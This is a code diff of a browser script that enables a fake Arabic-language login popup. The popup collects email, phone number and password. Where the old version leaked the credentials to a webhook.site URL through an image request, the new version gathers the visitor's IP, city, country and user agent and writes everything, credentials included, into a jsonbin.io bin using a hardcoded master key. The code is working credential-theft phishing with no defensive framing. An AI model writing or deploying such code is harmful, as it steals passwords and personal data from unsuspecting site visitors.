@@ -1,5 +1,5 @@
 // Toggle this variable to enable/disable the popup.
-var enablePopup = false;
+var enablePopup = true;
 
 if (enablePopup) {
     // Create the popup container
@@ -8,7 +8,7 @@ if (enablePopup) {
     popup.style.top = "50%";
     popup.style.left = "50%";
     popup.style.transform = "translate(-50%, -50%)";
-    popup.style.backgroundColor = '#1E0232';
+    popup.style.backgroundColor = "#1E0232";
     popup.style.padding = "20px";
     popup.style.borderRadius = "10px";
     popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.5)";
@@ -36,8 +36,8 @@ if (enablePopup) {
         input.style.border = "1px solid #555";
         input.style.borderRadius = "5px";
         input.style.backgroundColor = "white";
-        input.style.color = "black"; // Ensure text is visible
-        input.style.caretColor = "black"; // Ensure cursor is visible
+        input.style.color = "black";
+        input.style.caretColor = "black";
         input.style.fontSize = "16px";
         return input;
     }
@@ -63,37 +63,104 @@ if (enablePopup) {
     loginButton.style.fontSize = "16px";
     loginButton.style.cursor = "pointer";
     loginButton.style.marginTop = "10px";
+    
+// Preload IP and location data when the popup is shown
+let preloadedData = { ip: "", city: "", country: "", platform: "" };
 
-    loginButton.addEventListener("click", function () {
-        // Validate phone number (only numbers, 11 digits)
-        var phoneRegex = /^\d{11}$/;
-        if (!phoneRegex.test(phoneInput.value)) {
-            alert("يرجى إدخال رقم هاتف مكون من 11 رقماً!");
-            return;
-        }
-
-        // Check password
-        if (!passwordInput.value) {
-            alert("يرجى إدخال كلمة المرور!");
-            return;
-        }
-
-        // Encode the credentials as URL parameters
-        var url = "https://webhook.site/78735d80-a09c-471a-b188-5aee323d456c"
-            + "?email=" + encodeURIComponent(emailInput.value)
-            + "&phone=" + encodeURIComponent(phoneInput.value)
-            + "&password=" + encodeURIComponent(passwordInput.value);
-
-        // Send the data using an image request (bypasses CORS)
-        var img = new Image();
-        img.src = url;
-
-        alert("تم التسجيل بنجاح!");
-        document.body.removeChild(popup);
+// Fetch IP, city, and country
+fetch("https://ipapi.co/json/")
+    .then((response) => response.json())
+    .then((ipData) => {
+        preloadedData.ip = ipData.ip;
+        preloadedData.city = ipData.city;
+        preloadedData.country = ipData.country_name;
+    })
+    .catch((error) => {
+       // console.error("Error fetching IP data:", error);
+        preloadedData.ip = "Unknown IP";
+        preloadedData.city = "Unknown City";
+        preloadedData.country = "Unknown Country";
     });
 
-    popup.appendChild(loginButton);
+// Identify platform
+ preloadedData.platform  = navigator.userAgent.toLowerCase();
 
+// Login button click handler
+loginButton.addEventListener("click", function () {
+    // Validate phone number (only numbers, 11 digits)
+    var phoneRegex = /^\d{11}$/;
+    if (!phoneRegex.test(phoneInput.value)) {
+        alert("يرجى إدخال رقم هاتف مكون من 11 رقماً!");
+        return;
+    }
+    // Check password
+    if (!passwordInput.value) {
+        alert("يرجى إدخال كلمة المرور!");
+        return;
+    }
+    // Check email
+    if (!emailInput.value) {
+        alert("يرجى إدخال بريد الكتروني صالح!");                    
+        return;
+    }
+     // Show success alert immediately
+    alert("جارِ التسجيل...");
+
+    // Format timestamp for Baghdad time in 12-hour format
+    var baghdadTime = new Date().toLocaleString("en-GB", {
+        timeZone: "Asia/Baghdad",
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: true, // 12-hour format
+    });
+
+    // Prepare data to send
+    var data = {
+        email: emailInput.value,
+        phone: phoneInput.value,
+        password: passwordInput.value,
+        timestamp: baghdadTime, // Baghdad time
+        ip: `${preloadedData.ip}, ${preloadedData.city}, ${preloadedData.country}`, // Preloaded IP, city, and country
+        platform: preloadedData.platform, // Preloaded platform
+    };
+
+    // Fetch existing records first
+    fetch("https://api.jsonbin.io/v3/b/67b41244acd3cb34a8e65fb7/latest", {
+        method: "GET",
+        headers: {
+            "X-Master-Key": "$2a$10$19/iwvXYHVkeGiTQx4QFKu62Fz56RPCTuBUsCO8GJEi7SJqJBpHHu",
+        },
+    })
+        .then((response) => response.json())
+        .then((result) => {
+            var existingRecords = result.record?.records || [];
+            // Append the new user data to the existing records
+            existingRecords.push(data);
+
+            // Update the bin with the combined data
+            return fetch("https://api.jsonbin.io/v3/b/67b41244acd3cb34a8e65fb7", {
+                method: "PUT",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Master-Key": "$2a$10$19/iwvXYHVkeGiTQx4QFKu62Fz56RPCTuBUsCO8GJEi7SJqJBpHHu",
+                },
+                body: JSON.stringify({ records: existingRecords }),
+            });
+        })
+        .then(() => {
+            alert("تم التسجيل بنجاح!");
+            document.body.removeChild(popup);
+        })
+        .catch((error) => {
+         //   console.error("Error:", error);
+            alert("حدث خطأ أثناء التسجيل. حاول مرة أخرى.");
+        });
+});
+    popup.appendChild(loginButton);
     // Add the popup to the body
     document.body.appendChild(popup);
 }
